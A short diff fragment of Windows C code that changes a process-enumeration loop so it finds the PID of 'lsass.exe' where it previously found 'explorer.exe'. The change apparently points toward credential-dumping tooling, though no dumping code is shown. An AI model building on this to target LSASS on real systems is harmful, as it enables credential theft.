@@ -16,7 +16,7 @@ int main() {
     pe.dwSize = sizeof(pe);
     if (Process32First(snap, &pe)) {
         do {
-            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                 pid = pe.th32ProcessID;
                 break;
             }
